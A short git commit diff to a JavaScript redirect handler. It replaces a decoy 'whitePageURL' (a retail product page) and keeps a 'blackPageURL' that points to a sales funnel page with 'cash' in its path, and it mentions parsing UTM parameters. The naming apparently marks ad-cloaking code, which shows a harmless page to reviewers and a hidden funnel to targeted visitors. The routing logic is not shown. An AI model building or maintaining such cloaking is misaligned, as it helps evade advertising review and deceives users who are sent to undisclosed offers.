4daa7cbae7ba8b3be7dfca41bca263894b630214
Hassan86639 <hassan86639@gmail.com>
2025-01-06 19:07:56 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.crazysocks.com/products/noshow-ultralight-mens-sock?variant=1582695492";
+    const whitePageURL = "https://www.aldoshoes.com/us/en_US/men/yaren-brown/p/13682170";
     const blackPageURL = "https://vxajxfdwzd.myfunnelish.com/cash-1735686017557538-1736022022043965-1736024393533984";
   
     // Parse the UTM parameters from the request URL
